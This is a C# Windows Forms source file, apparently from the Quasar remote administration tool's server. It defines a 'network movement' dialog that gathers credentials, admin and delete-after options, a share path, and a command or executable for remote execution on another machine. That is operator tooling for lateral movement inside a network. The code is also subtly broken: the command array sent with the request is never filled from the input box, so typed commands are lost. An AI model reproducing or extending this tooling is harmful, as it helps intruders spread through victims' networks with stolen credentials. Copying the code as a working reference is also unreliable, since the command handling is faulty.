using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using Quasar.Common.Models.Network;

namespace Quasar.Server.Controls
{
    public partial class FrmNetworkMovementRequest : Form
    {
        public NetworkMovementRequest Request { get; private set; }
        private AddressEntity Address { get; set; }
        private ShareEntity[] Shares { get; set; }
        public bool IsCommand { get; private set; }
        public bool IsFile { get; private set; }
        public FrmNetworkMovementRequest(AddressEntity Address, ShareEntity[] Shares, bool IsCommand, bool IsFile)
        {
            InitializeComponent();
            this.Address = Address;
            this.Shares = Shares;
            this.IsCommand = IsCommand;
            this.IsFile = IsFile;
            labelAction.Visible = false;
            txtInput.Visible = false;
            btnOpenFile.Visible = false;
            txtPassword.UseSystemPasswordChar = true;
            cmbShares.Enabled = false;
            if (IsCommand)
            {
                labelAction.Visible = true;
                txtInput.Visible = true;
                labelAction.Text = "Command:";
            }
            if (IsFile)
            {
                labelAction.Visible = true;
                txtInput.Visible = true;
                txtInput.ReadOnly = true;
                labelAction.Text = "File Path:";
                btnOpenFile.Visible = true;
            }
        }

        private void btnOpenFile_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select an executable...";
                ofd.InitialDirectory = System.Reflection.Assembly.GetExecutingAssembly().Location;
                ofd.RestoreDirectory = true;
                ofd.Multiselect = false;
                ofd.Filter = "Executable File (*.exe)|*.exe";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtInput.Text = ofd.FileName;
                }
            }
        }

        private void chkShowPass_CheckedChanged(object sender, EventArgs e)
        {
            txtPassword.UseSystemPasswordChar = chkShowPass.Checked;
        }

        private void chkUseShares_CheckedChanged(object sender, EventArgs e)
        {
            cmbShares.Enabled = chkUseShares.Checked;
        }

        private void btnDone_Click(object sender, EventArgs e)
        {
            string[] Args = new string[1];
            Request = new NetworkMovementRequest
            {
                Username = txtUsername.Text,
                Password = txtPassword.Text,
                AsAdmin = chkAsAdmin.Checked,
                DeleteAfter = chkDeleteAfter.Checked,
                UseShare = chkUseShares.Checked,
                SharePath = cmbShares.Text,
                Command = Args,
                FilePath = txtInput.Text
            };
            this.DialogResult = DialogResult.OK;
            this.Close();
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            this.DialogResult = DialogResult.Cancel;
            this.Close();
        }

        private void FrmNetworkMovementRequest_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (this.Request == null)
            {
                this.DialogResult = DialogResult.Cancel;
            }
        }
    }

    public class NetworkMovementRequest
    {
        public string Username { get; set; }
        public string Password { get; set; }
        public bool AsAdmin { get; set; }
        public bool DeleteAfter { get; set; }
        public bool UseShare { get; set; }
        public string SharePath { get; set; }
        public string[] Command { get; set; }
        public string FilePath { get; set; }
    }
}
